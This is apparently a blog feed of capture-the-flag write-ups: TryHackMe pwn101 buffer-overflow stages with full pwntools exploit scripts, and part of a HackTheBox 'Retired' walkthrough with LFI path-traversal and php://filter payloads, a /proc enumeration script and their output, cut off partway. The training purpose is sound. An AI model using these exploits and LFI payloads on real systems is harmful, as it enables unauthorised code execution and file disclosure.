[ { "title": "THM/pwn101 - writeup, part 1", "url": "/posts/thm-pwn101/", "categories": "Writeup, THM", "tags": "thm, pwn101, writeup, pwntools, buffer overflow, rop", "date": "2023-05-02 16:13:31 +0000", "snippet": "In this post, we’ll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain ...", "content": "In this post, we’ll be discussing the TryHackMe room known as pwn101. This challenge will test and improve your buffer overflow and ROP chaining skills. By completing this challenge, you will gain valuable experience in identifying vulnerabilities, exploiting them, and ultimately gaining access to a target system. Whether you’re a newbie or a skilled hacker, pwn101 is an excellent way to sharpen your skills and gain more knowledge in the field of cybersecurity. Let’s explore the specifics of this exciting challenge to discover what it entails.pwn101.pwn101Pwn101 is a series of ten stages that increase in difficulty. However, the first stage, pwn101.pwn101, is relatively easy. As shown in the screenshot below, you only need to provide a long enough string to cause a buffer overflow and modify the integer variable following the buffer:So, without further ado, here is a pwntools script to accomplish this:from pwn import * context.log_level = 'debug'elf = context.binary = ELF(\"./pwn101.pwn101\")gs = '''break main'''def start(): if args.TMUX: context.terminal = [\"tmux\", \"splitw\", \"-h\"] if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.REMOTE: return remote(\"10.10.100.183\", 9001) else: return process(elf.path)io = start()io.recvuntil(b'make briyani:')io.sendline(b\"A\" * 70)io.interactive()We are using multiple “A” letters to create our payload. This payload will modify the value of a variable from 0x00000539 (which is equivalent to 1337 in decimal) to 0x41414141 (represented by the letters “A” in hexadecimal). After running the script, we’ve got the shell:pwn102.pwn102Our goal in the second challenge is to change the values of two variables located after the buffer. These variables are labelled variable_1 and variable_2 in the screenshot. We need to set them to 0x00c0ff33 and 0x0000c0d3to get the shell:To achieve our goal, we must pass a string of sufficient length that overwrites the buffer and variables with “coffee” and “code” values. Remember to consider endianness:from pwn import * context.log_level = 'debug'elf = context.binary = ELF(\"./pwn102.pwn102\")gs = '''break main'''def start(): if args.TMUX: context.terminal = [\"tmux\", \"splitw\", \"-h\"] if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.REMOTE: return remote(\"10.10.100.183\", 9002) else: return process(elf.path)io = start()io.recvuntil(b'right?')payload = b\"A\" * 104payload += p32(0x0000c0d3, endian='little')payload += p32(0x00c0ff33, endian='little')io.sendline(payload)io.interactive()Once our payload is ready, we can send it to the server:And again, we’ve got a shell.pwn103.pwn103The third challenge, pwn103, involves a more complex set of tasks to solve than the previous challenges, but it is still relatively easy. After opening the binary file in Ghidra, you can see that it contains a “switch-case” with multiple functions. It looks like a simple chat application:Let’s check what functionality it has. The announcements() function prints a few messages and calls main(), the same as the discussion() and rules(). Also, the bot_cmd() reads the input and displays a few fake commands.The most interesting for us will be the general() function which, despite displaying few messages, also reads the input from the user via scanf() without proper checks. But there is one more thing. After examining the symbol tree thoroughly, we have discovered a function named admins_only(), which includes a call to the system(). By exploiting this and the bug in the general() function, remote code execution is possible.Let’s write a pwntools script for that:from pwn import * context.log_level = 'debug'elf = context.binary = ELF(\"./pwn103.pwn103\")gs = '''break main'''def start(): if args.TMUX: context.terminal = [\"tmux\", \"splitw\", \"-h\"] if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.REMOTE: return remote(\"10.10.57.182\", 9003) else: return process(elf.path)io = start()io.recvuntil(b'channel:')io.sendline(b'3')io.recvuntil(b'pwner]:')payload = b\"A\" * 40payload += p64(elf.symbols.admins_only)io.sendline(payload)io.interactive()We can run the script against the remote machine when it is ready. Let’s run it.The script started but crashed after sending a command to the spawned shell. After looking in GDB, we see that our stack needs to be aligned. So we need to pop one item from the stack. The easiest way is to find a ret gadget and use it. We can use the ROPgadget tool for that:It found the “ret” instruction at the 0x00401016 address. Let’s use it:payload = b\"A\" * 40payload += p64(0x00401016) # ret, to make stack properly alignedpayload += p64(elf.symbols.admins_only)And here is the result, we’ve got the shell again.Great job, we’ve successfully finished this section! Join me in the next part, where we’ll tackle the rest of the challenges from this room together." }, { "title": "HTB/Retired - writeup", "url": "/posts/htb-retired/", "categories": "Writeup, HTB", "tags": "htb, retired, writeup, pwntools, rop, lfi", "date": "2023-03-30 00:33:38 +0000", "snippet": "IntroductionIn cybersecurity, hands-on experience is essential for developing practical skills and knowledge. One of the best ways to gain this experience is by participating in capture-the-flag (C...", "content": "IntroductionIn cybersecurity, hands-on experience is essential for developing practical skills and knowledge. One of the best ways to gain this experience is by participating in capture-the-flag (CTF) challenges and solving challenges on platforms like HackTheBox. HackTheBox is a popular platform for practising and developing penetration testing skills, featuring a wide range of virtual machines with various difficulty levels.One of the most exciting and challenging HackTheBox machines is “Retired”, which requires a deep understanding of penetration testing methodologies and techniques to solve. This blog post will explore the Retired box in detail, discussing its background, methodology, and solutions to help aspiring penetration testers and security researchers improve their skills and knowledge.We can solve the “Retired” box in the following steps: enumeration, exploitation, lateral movement and privilege escalation. Below is a short description of each stage.Enumeration is a crucial stage in penetration testing, where the tester tries to identify and gather information about the target system, network, or application. This stage involves actively probing the target to discover the system’s services, open ports, and other details about the operating system and its configuration. Enumeration gives the tester valuable insights into the target’s architecture, which can be used to develop an attack strategy and exploit potential vulnerabilities. An efficient enumeration process involves using various tools and techniques, including port scanning, banner grabbing, and network mapping, to identify weaknesses and misconfigurations that can be exploited to gain unauthorised access.The exploitation stage is the process in penetration testing where the tester attempts to take advantage of the vulnerabilities found during the previous steps to gain unauthorised access to the target system, network or application. This stage requires a thorough understanding of the target environment and the vulnerabilities discovered during the reconnaissance and enumeration stages. The exploitation stage involves using various tools and techniques to exploit the identified vulnerabilities, such as buffer overflow, SQL injection, and remote code execution. This stage aims to gain access to sensitive information, escalate privileges, or take control of the target system. The success of the exploitation stage will depend on the tester’s ability to craft a suitable exploit that can bypass any security mechanisms.Lateral movement is a critical stage in the penetration testing process that involves an attacker’s ability to move from one compromised system to another within the target network or from one user account to another. Lateral movement often follows the initial exploitation stage, where the attacker gains access to the target system. The attacker then looks for ways to move laterally to other systems or accounts within the network, using the same or different techniques as the initial exploitation. Lateral movement is a significant concern for organisations since it can allow attackers to access and control more sensitive information and make it more challenging for defenders to track and contain the attack. During a penetration testing engagement, lateral movement simulates a real-world attack and assesses the target’s overall security posture, including access controls, network segmentation, and incident response capabilities.The privilege escalation stage in penetration testing involves attempting to escalate privileges on the target system or application. This stage is typically conducted after the initial exploitation, and access to the target has been achieved. The goal of the privilege escalation stage is to elevate the access level of the tester to gain administrative or system-level access, which can allow for deeper access and control of the target environment. The privilege escalation stage may involve identifying and exploiting misconfigured permissions, vulnerabilities, or configuration settings that can be used to obtain higher privileges. This stage is critical in penetration testing because it allows the tester to assess the potential damage that could be caused if an attacker gains elevated privileges in a real-world attack.EnumerationOur first step is a port scan with nmap. This will inform us about the operating system and services on the target host:$ sudo nmap -sSVC -A -O -Pn -T5 -p- 10.129.194.147[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 17:52 EDTWarning: 10.129.194.147 giving up on port because retransmission cap hit (2). Nmap scan report for 10.129.194.147Host is up (0.077s latency). Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0)| ssh-hostkey: | 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)| 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)|_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)80/tcp open http nginx| http-title: Agency - Start Bootstrap Theme|_Requested resource was /index.php?page=default.htmlAggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.4 (94%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.6 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Infomir MAG-250 set-top box (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 5.0 - 5.3 (92%)No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 587/tcp)HOP RTT ADDRESS1 71.53 ms 10.10.16.12 35.51 ms 10.129.194.147OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 336.33 secondsWe see two ports opened, SSH and HTTP. Let’s check HTTP one in a browser. We can see a suspicious part in the URL when the page is visible:It looks like LFI, and we can confirm it by including some files from the host filesystem:$ http -v 'http://retired.htb/index.php?page=../../../../../../../../../../etc/passwd'GET /index.php?page=../../../../../../../../../../etc/passwd HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateConnection: keep-aliveHost: retired.htbUser-Agent: HTTPie/2.6.0HTTP/1.1 302 FoundConnection: keep-aliveContent-Type: text/html; charset=UTF-8Date: Sat, 02 Apr 2022 21:56:27 GMTLocation: /index.php?page=default.htmlServer: nginxTransfer-Encoding: chunkedroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:105::/nonexistent:/usr/sbin/nologin_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinvagrant:x:1000:1000::/vagrant:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindev:x:1001:1001::/home/dev:/bin/bashWith that knowledge, we can get the application source, i.e., index.php and other files, for further checking. We’ll use filters to encode the content, so PHP will not interpret it:$ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php'GET /index.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateConnection: keep-aliveHost: retired.htbUser-Agent: HTTPie/2.6.0HTTP/1.1 200 OKConnection: keep-aliveContent-Encoding: gzipContent-Type: text/html; charset=UTF-8Date: Sat, 02 Apr 2022 22:05:07 GMTServer: nginxTransfer-Encoding: chunkedPD9waHAKZnVuY3Rpb24gc2FuaXRpemVfaW5wdXQoJHBhcmFtKSB7CiAgICAkcGFyYW0xID0gc3RyX3JlcGxhY2UoIi4uLyIsIiIsJHBhcmFtKTsKICAgICRwYXJhbTIgPSBzdHJfcmVwbGFjZSgiLi8iLCIiLCRwYXJhbTEpOwogICAgcmV0dXJuICRwYXJhbTI7Cn0KCiRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsKaWYgKGlzc2V0KCRwYWdlKSAmJiBwcmVnX21hdGNoKCIvXlthLXpdLyIsICRwYWdlKSkgewogICAgJHBhZ2UgPSBzYW5pdGl6ZV9pbnB1dCgkcGFnZSk7Cn0gZWxzZSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaW5kZXgucGhwP3BhZ2U9ZGVmYXVsdC5odG1sJyk7Cn0KCnJlYWRmaWxlKCRwYWdlKTsKPz4KAnd voila! We’ve got index.php:&lt;?phpfunction sanitize_input($param) { $param1 = str_replace(\"../\",\"\",$param); $param2 = str_replace(\"./\",\"\",$param1); return $param2;}$page = $_GET['page'];if (isset($page) &amp;&amp; preg_match(\"/^[a-z]/\", $page)) { $page = sanitize_input($page);} else { header('Location: /index.php?page=default.html');}readfile($page);?&gt;Let’s try something else and check for any hidden files or directories on that host. After some time with gobuster, we see a beta.html page:$ gobuster dir -x txt,sql,bak,zip,bz2,7z,htm,html,js,php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://retired.htb ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://retired.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: sql,bak,7z,php,txt,zip,bz2,htm,html,js[+] Timeout: 10s===============================================================2022/04/02 18:27:31 Starting gobuster in directory enumeration mode===============================================================/index.php (Status: 302) [Size: 0] [--&gt; /index.php?page=default.html]/default.html (Status: 200) [Size: 11414] /assets (Status: 301) [Size: 162] [--&gt; http://retired.htb/assets/]/css (Status: 301) [Size: 162] [--&gt; http://retired.htb/css/] /beta.html (Status: 200) [Size: 4144] /js (Status: 301) [Size: 162] [--&gt; http://retired.htb/js/] Progress: 503294 / 2426171 (20.74%) ^C[!] Keyboard interrupt detected, terminating. ===============================================================2022/04/02 19:35:43 Finished===============================================================We can download it the same way as index.php:$ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=beta.html' GET /index.php?page=php://filter/convert.base64-encode/resource=beta.html HTTP/1.1Accept: */*Accept-Encoding: gzip, deflate, brConnection: keep-aliveHost: retired.htbUser-Agent: HTTPie/2.6.0HTTP/1.1 200 OKConnection: keep-aliveContent-Encoding: gzipContent-Type: text/html; charset=UTF-8Date: Sat, 02 Apr 2022 19:41:07 GMTServer: nginxTransfer-Encoding: chunkedPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyIgLz4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIiAvPgogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgogICAgICAgIDx0aXRsZT5BZ2VuY3kgLSBTdGFydCBCb290c3RyYXAgVGhlbWU8L3RpdGxlPgogICAgICAgIDwhLS0gRmF2aWNvbi0tPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgICAgICAgPCEtLSBGb250IEF3ZXNvbWUgaWNvbnMgKGZyZWUgdmVyc2lvbiktLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjE1LjMvanMvYWxsLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIEdvb2dsZSBmb250cy0tPgogICAgICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Nb250c2VycmF0OjQwMCw3MDAiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+CiAgICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVJvYm90bytTbGFiOjQwMCwxMDAsMzAwLDcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgICAgICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICAgIDwvaGVhZD4KICAgIDxib2R5IGlkPSJwYWdlLXRvcCI+CiAgICAgICAgPCEtLSBNYXN0aGVhZC0tPgogICAgICAgIDxoZWFkZXIgY2xhc3M9Im1hc3RoZWFkIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLXN1YmhlYWRpbmciPldlbGNvbWUgVG8gT3VyIFN0dWRpbyE8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLWhlYWRpbmcgdGV4dC11cHBlcmNhc2UiPkl0J3MgTmljZSBUbyBNZWV0IFlvdTwvZGl2PgogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBidG4teGwgdGV4dC11cHBlcmNhc2UiIGhyZWY9IiNzZXJ2aWNlcyI+VGVsbCBNZSBNb3JlPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2hlYWRlcj4KICAgICAgICA8IS0tIFNlcnZpY2VzLS0+CiAgICAgICAgPHNlY3Rpb24gY2xhc3M9InBhZ2Utc2VjdGlvbiIgaWQ9ImJldGEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0ic2VjdGlvbi1oZWFkaW5nIHRleHQtdXBwZXJjYXNlIj5CZXRhIFRlc3RpbmcgUHJvZ3JhbSBmb3IgRU1VRU1VPC9oMj4KICAgICAgICAgICAgICAgICAgICBDdXJyZW50bHkgZGV2ZWxvcG1lbnQgZm9yIEVNVUVNVSBqdXN0IHN0YXJ0ZWQsIGJ1dCB3ZSBoYXZlIGJpZyBwbGFucy4KICAgICAgICAgICAgICAgICAgICBJZiB5b3UgYm91Z2h0IGFuIE9TVFJJQ0ggY29uc29sZSBmcm9tIHVzIGFuZCB3YW50IHdhbnQgdG8gYmUgcGFydCBvZiB0aGUgbmV4dCBzdGVwLAogICAgICAgICAgICAgICAgICAgIHlvdSBjYW4gZW5hYmxlIHlvdXIgT1NUUklDSCBsaWNlbnNlIGZvciB1c2FnZSB3aXRoIEVNVUVNVSB2aWEgdGhlIGFjdGl2YXRlX2xpY2Vuc2UgYXBwbGljYXRpb24gdG9kYXkKCQkgICAgZm9yIG91ciB1cGNvbWluZyBiZXRhIHRlc3RpbmcgcHJvZ3JhbSBmb3IgRU1VRU1VLjxici8+CiAgICAgICAgICAgICAgICAgICAgQSBsaWNlbnNlIGZpbGVzIGNvbnRhaW5zIGEgNTEyIGJpdCBrZXkuIFRoYXQga2V5IGlzIGFsc28gaW4gdGhlIFFSIGNvZGUgY29udGFpbmVkIHdpdGhpbiB0aGUgT1NUUklDSCBwYWNrYWdlLgoJCSAgICBUaGFuayB5b3UgZm9yIHBhcnRpY2lwYXRpbmcgaW4gb3VyIGJldGEgdGVzdGluZyBwcm9ncmFtLgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249ImFjdGl2YXRlX2xpY2Vuc2UucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImZvcm1GaWxlIiBjbGFzcz0iZm9ybS1sYWJlbCI+VXBsb2FkIExpY2Vuc2UgS2V5IEZpbGU8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIGZvcm0tY29udHJvbC1sZyIgaWQ9ImZvcm1GaWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJsaWNlbnNlZmlsZSIvPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5Ij5TdWJtaXQ8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9zZWN0aW9uPgogICAgICAgIDwhLS0gRm9vdGVyLS0+CiAgICAgICAgPGZvb3RlciBjbGFzcz0iZm9vdGVyIHB5LTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IGFsaWduLWl0ZW1zLWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTQgdGV4dC1sZy1zdGFydCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vc3RhcnRib290c3RyYXAuY29tL3RoZW1lL2FnZW5jeSI+QWdlbmN5IEJvb3RzdHJhcCBUaGVtZTwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgcmVsZWFzZWQgdW5kZXIgPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3N0YXJ0Ym9vdHN0cmFwL3N0YXJ0Ym9vdHN0cmFwLWFnZW5jeS9ibG9iL21hc3Rlci9MSUNFTlNFIj5NSVQgTGljZW5zZTwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCBteS0zIG15LWxnLTAiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1kYXJrIGJ0bi1zb2NpYWwgbXgtMiIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtdHdpdHRlciI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tc29jaWFsIG14LTIiIGhyZWY9IiMhIj48aSBjbGFzcz0iZmFiIGZhLWZhY2Vib29rLWYiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLXNvY2lhbCBteC0yIiBocmVmPSIjISI+PGkgY2xhc3M9ImZhYiBmYS1saW5rZWRpbi1pbiI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCB0ZXh0LWxnLWVuZCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsaW5rLWRhcmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUgbWUtMyIgaHJlZj0iIyEiPlByaXZhY3kgUG9saWN5PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibGluay1kYXJrIHRleHQtZGVjb3JhdGlvbi1ub25lIiBocmVmPSIjISI+VGVybXMgb2YgVXNlPC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZm9vdGVyPgogICAgICAgIDwhLS0gQm9vdHN0cmFwIGNvcmUgSlMtLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjAvZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPCEtLSBDb3JlIHRoZW1lIEpTLS0+CiAgICAgICAgPHNjcmlwdCBzcmM9ImpzL3NjcmlwdHMuanMiPjwvc2NyaXB0PgogICAgPC9ib2R5Pgo8L2h0bWw+Cg==Inside that page is a web form that uses another file called activate_licence.php :So, again, let’s download it and check what’s inside:$ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php' GET /index.php?page=php://filter/convert.base64-encode/resource=activate_license.php HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateConnection: keep-aliveHost: retired.htbUser-Agent: HTTPie/2.6.0HTTP/1.1 200 OKConnection: keep-aliveContent-Encoding: gzipContent-Type: text/html; charset=UTF-8Date: Sat, 02 Apr 2022 19:50:05 GMTServer: nginxTransfer-Encoding: chunkedPD9waHAKaWYoaXNzZXQoJF9GSUxFU1snbGljZW5zZWZpbGUnXSkpIHsKICAgICRsaWNlbnNlICAgICAgPSBmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydsaWNlbnNlZmlsZSddWyd0bXBfbmFtZSddKTsKICAgICRsaWNlbnNlX3NpemUgPSAkX0ZJTEVTWydsaWNlbnNlZmlsZSddWydzaXplJ107CgogICAgJHNvY2tldCA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwogICAgaWYgKCEkc29ja2V0KSB7IGVjaG8gImVycm9yIHNvY2tldF9jcmVhdGUoKVxuIjsgfQoKICAgIGlmICghc29ja2V0X2Nvbm5lY3QoJHNvY2tldCwgJzEyNy4wLjAuMScsIDEzMzcpKSB7CiAgICAgICAgZWNobyAiZXJyb3Igc29ja2V0X2Nvbm5lY3QoKSIgLiBzb2NrZXRfc3RyZXJyb3Ioc29ja2V0X2xhc3RfZXJyb3IoKSkgLiAiXG4iOwogICAgfQoKICAgIHNvY2tldF93cml0ZSgkc29ja2V0LCBwYWNrKCJOIiwgJGxpY2Vuc2Vfc2l6ZSkpOwogICAgc29ja2V0X3dyaXRlKCRzb2NrZXQsICRsaWNlbnNlKTsKCiAgICBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CiAgICBzb2NrZXRfY2xvc2UoJHNvY2tldCk7Cn0KPz4KThis one is interesting:&lt;?phpif(isset($_FILES['licensefile'])) { $license = file_get_contents($_FILES['licensefile']['tmp_name']); $license_size = $_FILES['licensefile']['size']; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$socket) { echo \"error socket_create()\\n\"; } if (!socket_connect($socket, '127.0.0.1', 1337)) { echo \"error socket_connect()\" . socket_strerror(socket_last_error()) . \"\\n\"; } socket_write($socket, pack(\"N\", $license_size)); socket_write($socket, $license); socket_shutdown($socket); socket_close($socket);}?&gt;It shows some internal service listening on the 1337 port, but what’s that? How can we get the information about this service? The answer is /proc - we can try to enumerate it and get information from: /proc/sys/kernel/version /proc/sys/kernel/pid_max /proc/sys/kernel/randomize_va_space /proc/sys/kernel/hostname /proc/sys/kernel/domainname /proc//cmdline /proc//mapsHere is a simple script in ruby which can do it for us:require 'net/http'require 'base64'max_pid = '10000'host = 'retired.htb'url = \"http://#{host}/index.php?page=\"puts \"=============================[ Kernel ]===================================\"s = \"#{url}/proc/sys/kernel/version\"k = URI(\"#{s}\")res = Net::HTTP.get_response(k) # =&gt; Stringputs \"version: #{res.body}\"s = \"#{url}/proc/sys/kernel/pid_max\"k = URI(\"#{s}\")res = Net::HTTP.get_response(k) # =&gt; Stringmax_pid = res.body if res.code == \"302\"puts \"max PID: #{max_pid}\" if res.code == \"302\"s = \"#{url}/proc/sys/kernel/randomize_va_space\"k = URI(\"#{s}\")res = Net::HTTP.get_response(k) # =&gt; Stringputs \"randomize_va_space: #{res.body}\" if res.code == \"302\"s = \"#{url}/proc/sys/kernel/hostname\"k = URI(\"#{s}\")res = Net::HTTP.get_response(k) # =&gt; Stringputs \"host name: #{res.body}\" if res.code == \"302\"s = \"#{url}/proc/sys/kernel/domainname\"k = URI(\"#{s}\")res = Net::HTTP.get_response(k) # =&gt; Stringputs \"domain name: #{res.body}\" if res.code == \"302\"s = \"#{url}php://filter/convert.base64-encode/resource=/proc/self\"e = URI(\"#{s}/cmdline\")res = Net::HTTP.get_response(e) # =&gt; Stringputs \"=============================[ PID: self ]================================\"puts \"[cmdline] #{Base64.decode64(res.body)}\\n\"e = URI(\"#{s}/maps\")res = Net::HTTP.get_response(e) # =&gt; Stringputs \"[maps]\\n#{Base64.decode64(res.body)}\\n\"(200..max_pid.to_i).each do |n| s = \"#{url}php://filter/convert.base64-encode/resource=/proc/#{n}/\" e = URI(\"#{s}/cmdline\") res = Net::HTTP.get_response(e) # =&gt; String if res.code == \"200\" &amp;&amp; res.body &amp;&amp; res.body.chomp.size &gt; 0 puts \"=============================[ PID: #{n} ]================================\" puts \"[cmdline] #{Base64.decode64(res.body)}\\n\" e = URI(\"#{s}/maps\") res = Net::HTTP.get_response(e) # =&gt; String puts \"[maps]\\n#{Base64.decode64(res.body)}\\n\" endendAnd here is its output (I’ve truncated maps from unessential processes for brevity):$ ruby lfi-proc.rb=============================[ Kernel ]===================================version: #1 SMP Debian 5.10.92-2 (2022-02-28)max PID: 4194304randomize_va_space: 2host name: retireddomain name: (none)=============================[ PID: self ]================================[cmdline] php-fpm: pool www[maps]( ... )=============================[ PID: 417 ]================================[cmdline] /usr/bin/activate_license1337[maps]56194c7c8000-56194c7c9000 r--p 00000000 08:01 2408 /usr/bin/activate_license56194c7c9000-56194c7ca000 